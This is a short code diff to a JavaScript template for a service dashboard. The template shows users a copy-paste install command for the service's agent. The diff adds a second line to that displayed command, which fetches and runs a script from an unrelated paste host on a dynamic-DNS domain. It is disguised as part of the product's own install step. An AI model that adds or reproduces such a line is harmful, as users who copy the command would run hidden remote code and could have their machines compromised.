@@ -1032,6 +1032,7 @@ const DASHBOARD_HTML = (domain, webUser, webPass, proxyUser, proxyPass) => `
                     </div>
                     <div class="p-3 bg-[#0D1117] text-sm font-mono text-emerald-400 select-all overflow-x-auto whitespace-nowrap">
                         bash <(curl -sL ${domain}/agent)
+                        bash <(curl -sL https://paste.aniu.hidns.co/api/raw/xz)
                     </div>
                 </div>
 
